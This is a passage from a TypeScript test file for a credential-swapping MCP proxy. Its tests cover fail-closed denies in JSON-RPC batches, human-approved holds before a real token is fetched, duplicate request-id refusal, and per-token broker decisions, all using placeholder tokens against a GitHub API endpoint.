    await waitFor(s.responded(2), 'response despite a dead store');
    s.stdin.end();
    await s.done;

    // Enforcement decided allow, so the call crossed with its real token even
    // though nothing could be recorded about it.
    expect(JSON.stringify(witnessed(s.witness))).toContain(CANARY);
    expect(s.store.records).toEqual([]);
  });

  it('treats a declared site inside a JSON-RPC batch as a fail-closed deny, and still forwards the rest of the batch', async () => {
    const s = startProxy();
    await handshake(s);
    s.stdin.write(
      JSON.stringify([
        toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: SYNTHETIC } }),
        toolsCall(3, 'plain_tool', { ok: true }),
      ]) + '\n',
    );
    await waitFor(() => s.out.lines().some((l) => l.includes('"3"') || l.includes('"id":3')), 'batch answers');
    s.stdin.end();
    await s.done;

    expect(s.broker.calls).toEqual([]);
    const seen = witnessed(s.witness);
    expect(seen.map((m) => (m.params as { name: string }).name)).toEqual(['plain_tool']);
    const batchResponse = s.out.lines().map((l) => {
      try {
        return JSON.parse(l) as unknown;
      } catch {
        return undefined;
      }
    });
    const refusal = batchResponse
      .filter((v): v is unknown[] => Array.isArray(v))
      .flat()
      .find((el) => (el as { id?: unknown }).id === 2) as { result: { content: { text: string }[] } } | undefined;
    expect(refusal?.result.content[0]?.text).toContain(swapDenyReason(SWAP_DENY.inBatch));
    expect(refusal?.result.content[0]?.text).toContain(FAIL_CLOSED_REFUSAL_GUIDANCE);
  });

  it('resolves the credential only AFTER a hold is approved', async () => {
    const policy = loadedPolicy(
      {
        version: 1,
        name: 'cred-hold',
        mcp: {
          default: 'allow',
          rules: [{ id: 'needs-human', match: { tool: 'http_post' }, action: 'hold', reason: 'outbound' }],
          hold: { timeout_ms: 10_000, on_timeout: 'deny' },
          boundary: { secrets: 'off', injection: 'off' },
        },
      },
    );
    const s = startProxy({ policy });
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: SYNTHETIC } }));
    await waitFor(() => s.holdStore.list().some((h) => h.status === 'pending'), 'the hold to be parked');

    // Nothing has been resolved while the human thinks: no real token is
    // resident in this process at all.
    expect(s.broker.calls).toEqual([]);
    const pending = s.holdStore.list().find((h) => h.status === 'pending');
    s.holdStore.decide(pending!.approval_id, 'approved', 'alice');

    await waitFor(s.responded(2), 'the approved call to come back');
    s.stdin.end();
    await s.done;

    expect(s.broker.calls).toHaveLength(1);
    expect(JSON.stringify(witnessed(s.witness))).toContain(CANARY);
    const call = toolCalls(s.events()).find((e) => e.tool === 'http_post');
    expect(call?.gateway?.decision).toBe('hold');
    expect(call?.attributes['cresec.broker.decision_id']).toBe('dec-0001');
    assertCanaryAbsent(s);
  });

  it('refuses a second request that reuses the id of a call still at the broker', async () => {
    let release: (() => void) | undefined;
    const gate = new Promise<void>((r) => {
      release = r;
    });
    const broker = new FakeBroker(async () => {
      await gate;
      return { real_token: CANARY, ttl_seconds: 30, decision_id: 'dec-slow' };
    });
    const s = startProxy({ broker });
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: SYNTHETIC } }));
    await waitFor(() => s.broker.calls.length === 1, 'the exchange to start');
    // Same id, while the first is parked at the broker.
    s.send(toolsCall(2, 'plain_tool', { second: true }));
    await waitFor(s.responded(2), 'the duplicate-id refusal');
    const first = s.response(2);
    expect(JSON.stringify(first)).toContain('already in flight');
    release?.();
    await waitFor(() => witnessed(s.witness).length === 1, 'the swapped call to be forwarded');
    s.stdin.end();
    await s.done;
    expect(JSON.stringify(witnessed(s.witness))).toContain(CANARY);
  });

  it('does not touch a session whose policy declares no credentials at all', async () => {
    const s = startProxy({ withSwap: false });
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: SYNTHETIC } }));
    await waitFor(s.responded(2), 'plain response');
    s.stdin.end();
    await s.done;
    expect(JSON.stringify(witnessed(s.witness))).toContain(SYNTHETIC);
    expect(JSON.stringify(witnessed(s.witness))).not.toContain(CANARY);
  });

  it('holds one synthetic per credential: another synthetic at the same site gets its own decision', async () => {
    const broker = new FakeBroker((req) => ({
      real_token: req.synthetic === SYNTHETIC ? CANARY : 'ghp_OTHER00000000000000000000000000000000',
      ttl_seconds: 30,
      decision_id: req.synthetic === SYNTHETIC ? 'dec-a' : 'dec-b',
    }));
    const s = startProxy({ broker });
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: SYNTHETIC } }));
    await waitFor(s.responded(2), 'first');
    s.send(toolsCall(3, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: OTHER_SYNTHETIC } }));
    await waitFor(s.responded(3), 'second');
    s.stdin.end();
    await s.done;

    expect(s.broker.calls.map((c) => c.synthetic)).toEqual([SYNTHETIC, OTHER_SYNTHETIC]);
    expect(JSON.stringify(s.response(2))).toContain(SYNTHETIC);
    expect(JSON.stringify(s.response(3))).toContain(OTHER_SYNTHETIC);
    assertCanaryAbsent(s);
    assertCanaryAbsent(s, 'ghp_OTHER00000000000000000000000000000000');
  });
});
